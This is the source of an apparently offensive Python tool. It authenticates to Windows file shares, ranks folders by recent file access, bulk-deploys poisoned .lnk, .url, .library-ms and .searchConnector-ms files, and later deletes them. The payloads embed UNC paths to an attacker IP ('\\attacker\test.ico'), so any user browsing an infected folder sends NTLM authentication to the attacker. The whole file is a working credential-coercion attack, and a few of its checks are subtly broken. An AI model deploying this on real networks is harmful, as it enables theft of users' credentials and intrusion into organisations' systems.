"""
Author: George Hamilton
Description: This module is used to rank and filter the optimal share locations for deploying
payloads that coerce authentication based on recent access. This module can then be used to bulk
deploy multiple types of payloads to the identified locations. Lastly, this module can be used to
bulk cleanup multiple types of payloads from the identified locations.
"""
from datetime import datetime, timedelta
import sys
import json
import argparse
from smbclient import ClientConfig, scandir, remove, open_file
from smbprotocol.exceptions import SMBException
from pathlib import Path

def read_targets(targets_file):
    """
    read_targets(targets_file)

    :param str targets_file: Path to a text file containing UNC paths to file shares and base
    directories.
    :return: List of target UNC paths

    Reads in a list of targets from a specified file path and returns a list of targets.
    Catches an exception and prints an error if the targets file does not exist.
    """
    targets = []

    # Read share targets into an array
    try:
        with open(targets_file, 'r', encoding="utf-8") as file:
            targets = file.read().splitlines()
    except:
        print('Error opening targets file. Make sure it exists and review its permissions.')

    return targets


def get_sorted_rankings(targets, active_threshold, max_depth, go_fast):
    """
    get_sorted_rankings(targets, active_threshold, max_depth, go_fast)

    :param list targets: List of UNC paths to shares and base directories to review.
    :param int active_threshold: Number of days within which file access constitutes a file being
    active
    :param int max_depth: Number of layers of folders to search. 1 searches only the specified
    target UNC paths and none of their subfolders.
    :param bool go_fast: If True, folders will be marked as active as soon as a single file is
    meeting the active_threshold criteria is found. A rank of 1 will be assigned to all active
    folders.

    :return: A dictionary in the format {<folder UNC path>: <ranking>} sorted by ranking

    Accepts a list of UNC paths to file shares and base directories. Gets the ranking associated
    with each folder based on the number of files active within the active_threshold number of days.
    Recursively assigns ranking to subfolders up to max_depth. If go_fast is enabled, assigns the
    rank of 1 to all folders with a single active file and moves on to the next folder. Returns a
    dirctionary of UNC paths and associated rankings. Catches exceptions for failed smb connections
    and prints a message describing the error.
    """
    # Track rankings for each folder, which are (counterintuitively) scores corresponding to the
    # number of active files in a folder. {<folder UNC path>: <ranking>}
    folder_rankings = {}
    for share in targets:
        try:
            # Call the appropriate review function based on the fast argument
            folder_rankings = review_folder(folder_rankings, share, active_threshold,max_depth,
                                            go_fast)

        except SMBException as e:
            print(f"Error connecting to {share}: {e}")

    # Sort the folder UNC paths by rankings
    sorted_rankings = dict(sorted(folder_rankings.items(), key=lambda item: item[1], reverse=True))
    return sorted_rankings


def filter_targets(targets, sorted_rankings, max_folders_per_target):
    """
    filter_targets(targets, sorted_rankings, max_folders_per_target)

    :param list targets: List of UNC paths to shares and base directories to review.
    :param dict sorted_rankings: A dictionary in the format {<folder UNC path>: <ranking>} sorted
    by ranking.
    :param int max_folders_per_target: Number of deployment targets to output per supplied
    target share or folder.

    :return: A list of UNC paths for payload deployemnt. This contains at most
    max_folders_per_target deployment targets for each supplied target share or folder.

    Accepts a list of target shares or folders supplied by the user, a dictionary sorted by ranking
    of each potential deployment target and its ranking, and a maximum number of deployment targets
    per supplied target. Returns a list of deployment targets.
    """
    filtered_rankings = []

    # For each share target in the list
    for share in targets:
        # Filter the dictionary to only include keys that begin with the share target
        matching_share_paths = [key for key in sorted_rankings.keys() if share == key or f'{share}\\' == key[:len(share)+1]]

        # Sort the matching share paths based on their ranking and keep only the top N
        top_matching_share_paths = sorted(matching_share_paths,
                                        key=lambda key: sorted_rankings[key], reverse=True)[:max_folders_per_target]

        # Update the sorted_rankings dictionary with the top N matching share paths
        filtered_rankings.extend(top_matching_share_paths)

    return filtered_rankings


def is_valid_payload_name(payload_name, available_extensions):
    """
    is_valid_payload_name(payload_name, available_extensions)

    :param str payload_name: A potential name for payloads
    :param list available_extensions: A list of supported payload extensions (without the .)

    :return: A bool indicateing whether or not the payload name is valid.

    Accepts a potential payload name. Validates the payload name has an extension and that the
    extension is supported. Returns True if the payload name is valid or False if it is not.
    """
    invalid_payload_message = 'Invalid payload extension provided. Payload must end in one of the'\
                              'following:'
    for available_extension in available_extensions:
        invalid_payload_message = invalid_payload_message + (f'\n\t.{available_extension}')

    if '.' not in payload_name:
        print(invalid_payload_message)
        return False
    elif payload_name.split(".")[-1] not in available_extensions:
        print(invalid_payload_message)
        return False
    else:
        return True


def write_payload_remote(folder_unc, payload_name, payload_contents):
    """
    write_payload_remote(folder_unc, payload_name, payload_contents)

    :param str folder_unc: UNC folder path to which the payload should be written
    :param str payload_name: File name, including extension, of the payload
    :param str payload_contents: Contents to write to the payload file


    :return: A bool indicateing whether or not the payload was written successfully.

    Accepts a fold UNC path, payload name, and payload contents. Writes the supplied contents
    to the specified file and folder. Returns a bool indicating if the payload was written
    successfully.
    """
    payload_unc = f'{folder_unc}\\{payload_name}'
    if payload_name.split('.')[-1] == '.lnk':
        try:  # Try to write the payload
            with open_file(payload_unc, mode='wb') as payload_file:
                payload_file.write(payload_contents)
        except:  # Print a message and don't track the folder if writing the payload to it fails
            print(f'Failed to write payload at: {payload_unc}')
            return False
    else:
        try:  # Try to write the payload
            with open_file(payload_unc, mode='w', newline='\r\n') as payload_file:
                payload_file.write(payload_contents)
        except:  # Print a message and don't track the folder if writing the payload to it fails
            print(f'Failed to write payload at: {payload_unc}')
            return False

    # If writing the payload doesn't fail, then return True
    return True


def write_payload_local(payload_name, payload_contents):
    """
    write_payload_local(payload_name, payload_contents)

    :param str payload_name: File name, including extension, of the payload
    :param str payload_contents: Contents to write to the payload file


    :return: A bool indicateing whether or not the payload was written successfully.

    Accepts a folder path, payload name, and payload contents. Writes the supplied contents
    to the specified file and folder. Returns a bool indicating if the payload was written
    successfully.
    """
    if payload_name.split('.')[-1] == '.lnk':
        try:  # Try to write the payload
            with open(payload_name, mode='wb') as payload_file:
                payload_file.write(payload_contents)
        except:  # Print a message and don't track the folder if writing the payload to it fails
            print(f'Failed to write payload at: {payload_name}')
            return False
    else:
        try:  # Try to write the payload
            with open(payload_name, mode='w', newline='\r\n') as payload_file:
                payload_file.write(payload_contents)
        except Exception as e:  # Print a message and don't track the folder if writing the payload to it fails
            print(f'Failed to write payload at: {payload_name}')
            return False

    # If writing the payload doesn't fail, then return True
    return True


def delete_payload(payload_folder, payload_name):
    """
    delete_payload(folder_unc, payload_name, payload_contents)

    :param str payload_folder: UNC path to a folder containing a paylaod
    :param str payload_name: File name, including extension, of the payload

    :return: A bool indicateing whether or not the payload was deleted successfully.

    Accepts a payload folder and payload name. Attempts to delete the payload from
    from the specified folder. Returns a bool indicating if the payload was written
    successfully.
    """
    payload_unc = f'{payload_folder}\\{payload_name}'
    try:  # Try to delete the payload file
        remove(payload_unc)
    except:  # Print a message if deletion fails
        print(f'Failed to delete payload at: {payload_unc}')
        return False
    return True


def write_list_to_file(input_list, file_path, mode='w'):
    """
    write_list_to_file(list, file_path)

    :param list list: A list
    :param str file_path: Path to a file to which to write
    :param str mode: String indicating the mode in which to open the output file.
    Defaults to 'w' for write.

    Writes items in a list to a specified file, one per line.
    """
    with open(file_path, mode=mode, encoding="utf-8") as f:
        for item in input_list:
            f.write(item + '\n')

def review_folder(folder_rankings, unc_path, active_threshold, depth, fast):
    """
    review_folder(folder_rankings, unc_path, active_threshold, depth, fast)

    :param dict folder_rankings: Dictionary of folder UNC paths and rankings reflecting the number
    of active files in the folder. {<folder UNC path>: <ranking>}
    :param str unc_path: UNC path for the current folder being reviewed
    :param int active_threshold: Number of days within which file access constitutes a file being
    active
    :param int depth: Number of layers of folders to search. 1 searches only the specified folder
    and none of its subfolders.
    :param bool fast: If True, the current folder will be marked as active as soon as a single file
    is found. A rank of 1 will be assigned to all active folders.

    :return: Dictionary of folder UNC paths as keys and rankings as values

    Iterates over files and subfolders starting at the specified UNC path up to the
    specified depth. Each folder is assigned a rank, tracked in folder rankings by its
    UNC path, based on the number of active files it contains. Active files are files
    accessed within the number of days specified in active threshold. If fast is set
    to True, then the folder will receive a rank of 1 or 0 depending on if it contains
    at least one active file or none.
    """
    ranking = 0
    folders = []
    # Use scandir as a more efficient directory listing as it already contains info like stat and
    # attributes.
    for file_info in scandir(unc_path):
        # For files in the directory
        if file_info.is_file():
            # If in fast mode and an active file has already been identified, then move on to the
            # next directory item.
            if fast and ranking > 0:
                # If we do not need to search subdirectories because we've reached the max depth,
                # then stop reviewing files and folders in the directory as soon as one active
                # file is found. Otherwise, continue reviewing items to gather a list of
                # subdirectories for further review.
                if depth - 1 <= 0:
                    break  # Stop reviewing items in the folder
                else:
                    continue  # Move on to the next directory item

            # If the file was recently accessed and is not a payload file
            access_time = datetime.fromtimestamp(file_info.stat().st_atime)

            if datetime.now() - access_time <= timedelta(days=active_threshold):
                # Then increment the ranking of the folder to reflect the level of activity
                ranking += 1

        elif file_info.is_dir():  # Track a list of subfolders in the current folder
            folders.append(f'{unc_path}\\{file_info.name}')

    # For each subfolder in the current folder
    if depth - 1 > 0:  # If the max depth has not been reached
        # Then review each subfolder, appending the results of the review to the folder_rankings
        for subfolder_unc in folders:
            folder_rankings = {**folder_rankings, **review_folder(folder_rankings, subfolder_unc,
                                                              active_threshold, depth - 1, fast)}
            # Requires python 3.9 or greater, commented for >= python 3.5 compatability
            # folder_rankings = folder_rankings | review_folder(folder_rankings, subfolder_unc,
            #                                                  active_threshold, depth - 1, fast)

    # Update folder_rankings with the rank of the current folder and return it
    folder_rankings[unc_path] = ranking
    return folder_rankings


def create_lnk(attacker_ip):
    """
    create_lnk(attacker_ip, payload_name)

    This function generates a Windows shortcut (.lnk) file with a specified icon and target UNC
    path and returns the contents as bytes.

    :param attacker_ip (str): The IP address of the attacker's machine.
    :param payload_name (str): The desired name of the output shortcut file.

    :return: Returns bytes if the lnk file is successfully created; otherwise, returns False.

    The function creates a shortcut file by injecting the attacker's IP address into a provided lnk
    template. It sets the icon file UNC path and the target UNC path in the lnk file to the
    provided attacker's IP. If the resulting path names exceed the maximum tested length of 238
    characters, the function prints a message and returns False. Otherwise, it returns the content
    of the generated shortcut file as bytes.
    """
    img_unc_offset = 0x16D # Offset to the icon file unc path in the template
    target_unc_offset = 0x931 # Offset to the target for the lnk file in the template
    max_path = 239 # Max tested length is 238

    img_unc_path = f'\\\\{attacker_ip}\\test.ico'
    target_unc_path = f'\\\\{attacker_ip}\\test'

    if len(img_unc_path) >= max_path or len(target_unc_path) >= max_path:
        print("Path name too long for lnk template, skipping.")
        return False

    img_unc_path = (img_unc_path + '\x00').encode('utf-16le')
    target_unc_path = (target_unc_path + '\x00').encode('utf-16le')

    with open('template.lnk', 'rb') as lnk:
        shortcut = list(lnk.read())

    for i in range(0, len(img_unc_path)):
        shortcut[img_unc_offset + i] = img_unc_path[i]

    for i in range(0, len(target_unc_path)):
        shortcut[target_unc_offset + i] = target_unc_path[i]

    return shortcut


def main():
    """
    main()

    Main function for command line usage.
    """
    # Parse script arguments
    parser = argparse.ArgumentParser(
        description='Identify and rate folders in shares based on access frequency, deploy '
                    'malicious URL files, and cleanup results.')

    # Modes
    subparsers = parser.add_subparsers(title='Modes', dest='mode')

    # Arguments for generating a payload locally
    generate_parser = subparsers.add_parser('generate', help='Output specified payload file'
                            'to the current directory instead of a remote location.')
    generate_required_group = generate_parser.add_argument_group('Required Arguments')
    generate_required_group.add_argument('-a', '--attacker', required=True,
                        help='Attacker IP or hostname to place in malicious URL')
    generate_parser.add_argument('-n', '--payload', default='@Test_Do_Not_Remove.searchConnector-ms', help='(Default: @Test_Do_Not_Remove.searchConnector-ms) Name '
                        'of payload file ending in .library-ms, .searchConnector-ms, .lnk, or .url')

    # Arguments for outputting rankings of potential folders into which to place poisoned files
    rank_parser = subparsers.add_parser('rank', help='Output identified subfolders and rankings to folder_rankings.txt')
    rank_required_group = rank_parser.add_argument_group('Required Arguments')
    rank_required_group.add_argument('-u', '--username', required=True, help='Username for authenticating to each '
                        'share')
    rank_required_group.add_argument('-p', '--password', required=True, help='Password for authenticating to each '
                        'share')
    rank_required_group.add_argument('-d', '--domain', required=True, help='Domain for authenticating to each share.'
                        'Specify "." for local authentication')
    rank_required_group.add_argument('-t', '--targets', required=True,
                        help='Path to a text file containing UNC paths to file shares / base '
                        'directories within which to rank folders as potential locations for placing'
                        ' poisoned files.')
    rank_parser.add_argument('-md', '--max-depth', type=int, default=3, help='(Default: 3) The maximum depth of folders to '
                        'search within the target.')
    rank_parser.add_argument('-at', '--active-threshold', type=int, default=2, help='(Default: 2) Number of days as an '
                        'integer for active files.')
    rank_parser.add_argument('-f', '--fast', action='store_true', default=False, help='(Default: False) Mark folders active as'
                        ' soon as one active file in them is identified and move on. Ranks are '
                        'all set to 1 assigned.')

    # Arguments for identifying and outputting UNC paths to optimal folders into which to place poisoned files
    idenitfy_parser = subparsers.add_parser('identify', help='Identify target folders for payload distribution '
                                            'and output to folder_targets.txt')
    identify_required_group = idenitfy_parser.add_argument_group('Required Arguments')
    identify_required_group.add_argument('-u', '--username', required=True, help='Username for authenticating to each '
                        'share')
    identify_required_group.add_argument('-p', '--password', required=True, help='Password for authenticating to each '
                        'share')
    identify_required_group.add_argument('-d', '--domain', required=True, help='Domain for authenticating to each share.'
                        'Specify "." for local authentication')
    identify_required_group.add_argument('-t', '--targets', required=True,
                        help='Path to a text file containing UNC paths to file shares / base '
                        'directories for deployment or from which to remove payload files')
    idenitfy_parser.add_argument('-md', '--max-depth', type=int, default=3, help='(Default: 3) The maximum depth of folders to '
                        'search within the target')
    idenitfy_parser.add_argument('-at', '--active-threshold', type=int, default=2, help='(Default: 2) Max number of days since '
                                 ' within which a file is considered active.')
    idenitfy_parser.add_argument('-f', '--fast', action='store_true', default=False, help='(Default: False) Mark folders active as'
                        ' soon as one active file in them is identified and move on. Ranks are '
                        'all set to 1.')
    idenitfy_parser.add_argument('-mf', '--max-folders-per-target', type=int, default=10, help='(Default: 10) Maximum number of '
                            'folders to output as deployment targets per supplied target share or '
                            'folder.')

    # Arguments for deploying poisoned files to specified locations
    deploy_parser = subparsers.add_parser('deploy', help='Deploy payloads to all folder UNC '
                        'paths listed one per line in the file specified using --targets')
    deploy_required_group = deploy_parser.add_argument_group('Required Arguments')
    deploy_required_group.add_argument('-u', '--username', required=True, help='Username for authenticating to each '
                        'share')
    deploy_required_group.add_argument('-p', '--password', required=True, help='Password for authenticating to each '
                        'share')
    deploy_required_group.add_argument('-d', '--domain', required=True, help='Domain for authenticating to each share.'
                        'Specify "." for local authentication')
    deploy_required_group.add_argument('-t', '--targets', required=True,
                        help='Path to a text file containing UNC paths to folders into which poisoned '
                         'files will be deployed.')
    deploy_required_group.add_argument('-a', '--attacker', required=True, help='Attacker IP or hostname to place in poisoned '
                        'files.')
    deploy_parser.add_argument('-n', '--payload', default='@Test_Do_Not_Remove.searchConnector-ms', help='(Default: @Test_Do_Not_Remove.searchConnector-ms) Name '
                            'of payload file ending in .library-ms, .searchConnector-ms, .lnk, or .url')

    # Arguments for cleaning up deployed payloads when finished
    cleanup_parser = subparsers.add_parser('cleanup', help='Delete poisoned files from folder UNC paths'
                                           'specified in --targets')
    cleanup_required_group = cleanup_parser.add_argument_group('Required Arguments')
    cleanup_required_group.add_argument('-u', '--username', required=True, help='Username for authenticating to each '
                        'share')
    cleanup_required_group.add_argument('-p', '--password', required=True, help='Password for authenticating to each '
                        'share')
    cleanup_required_group.add_argument('-d', '--domain', required=True, help='Domain for authenticating to each share.'
                        'Specify "." for local authentication')
    cleanup_required_group.add_argument('-t', '--targets', required=True,
                        help='Path to a text file containing UNC paths to folders in which poisoned '
                         'files are located.')
    cleanup_required_group.add_argument('-a', '--attacker', required=True, help='Attacker IP or hostname to place in poisoned '
                        'files.')
    cleanup_parser.add_argument('-n', '--payload', default='@Test_Do_Not_Remove.searchConnector-ms', help='(Default: @Test_Do_Not_Remove.searchConnector-ms) Name '
                            'of payload file ending in .library-ms, .searchConnector-ms, .lnk, or .url')

    # Parse arguments
    args = parser.parse_args()

    if args.mode == 'generate':
        # Validate the provided payload name and exit if it's invalid
        available_extensions = ['searchConnector-ms', 'library-ms', 'url', 'lnk']
        if not is_valid_payload_name(args.payload, available_extensions):
            return

        # Select a template file name based on the payload name
        template_name = Path(__file__).parent / f'template.{args.payload.split(".")[-1]}'

        if template_name == 'template.lnk':
            payload_contents = create_lnk(args.attacker)

        else:
            # Read the payload template contents into a file and substitute the connection string
            # to the attacker as appropriate.
            with open(template_name, 'r', encoding="utf-8") as template_file:
                payload_contents = template_file.read()
                payload_contents = payload_contents.format(attacker_ip=args.attacker)

        # Write payload to file in the current directory
        write_payload_local(args.payload, payload_contents)

    elif args.mode == 'rank': # If rank functionality is used to rank active folders
        # Setup default login credentials
        ClientConfig(username=f'{args.domain}\\{args.username}', password=args.password)

        # Read share targets into an array
        targets = read_targets(args.targets)

        sorted_rankings = get_sorted_rankings(targets, args.active_threshold, args.max_depth,
                                              args.fast)

        # Write all reviewed subfolders and their rankings to a file
        with open('folder_rankings', mode='w', encoding="utf-8") as f:
            f.write(json.dumps(sorted_rankings, indent=4, sort_keys=False))

    elif args.mode == 'identify':  # Else if identification functionality is used to identify active folders
        # Setup default login credentials
        ClientConfig(username=f'{args.domain}\\{args.username}', password=args.password)

        # Read share targets into an array
        targets = read_targets(args.targets)

        sorted_rankings = get_sorted_rankings(targets, args.active_threshold, args.max_depth,
                                              args.fast)
        filtered_targets = filter_targets(targets, sorted_rankings, args.max_folders_per_target)

        # Write the highest ranked active shares to folder_targets.txt for review and deployment
        write_list_to_file(filtered_targets, 'folder_targets.txt')

    elif args.mode == 'deploy':  # Else if the deploy functionality is used to deploy payloads
        # Setup default login credentials
        ClientConfig(username=f'{args.domain}\\{args.username}', password=args.password)

        # Read share targets into an array
        targets = read_targets(args.targets)

        payloads_written = []  # Track the UNC path of the folder to which each payload is written

        # Validate the provided payload name and exit if it's invalid
        available_extensions = ['searchConnector-ms', 'library-ms', 'url', 'lnk']
        if not is_valid_payload_name(args.payload, available_extensions):
            return

        # Select a template file name based on the payload name
        template_name = f'template.{args.payload.split(".")[-1]}'

        if template_name == 'template.lnk':
            payload_contents = create_lnk(args.attacker)

        else:
            # Read the payload template contents into a file and substitute the connection string
            # to the attacker as appropriate.
            with open(template_name, 'r', encoding="utf-8") as template_file:
                payload_contents = template_file.read()
                payload_contents = payload_contents.format(attacker_ip=args.attacker)

        # Iterate over each target folder path
        for folder_unc in targets:
            # Attempt to write a paylaod to each location
            write_successful = write_payload_remote(folder_unc, args.payload, payload_contents)
            if write_successful:
                payloads_written.append(folder_unc)

        # Save the list of payloads successfully written for easy cleanup
        write_list_to_file(payloads_written, 'payloads_written.txt', 'a')

    elif args.mode == 'cleanup':  # Else if the cleanup functionality is used to delete deployed payloads
        # Setup default login credentials
        ClientConfig(username=f'{args.domain}\\{args.username}', password=args.password)

        # Read share targets into an array
        targets = read_targets(args.targets)

        # Iterate over each folder where payloads were deployed
        for payload_folder in targets:
            # Delete the payload at the specified path
            delete_payload(payload_folder, args.payload)

if __name__ == "__main__":
    main()
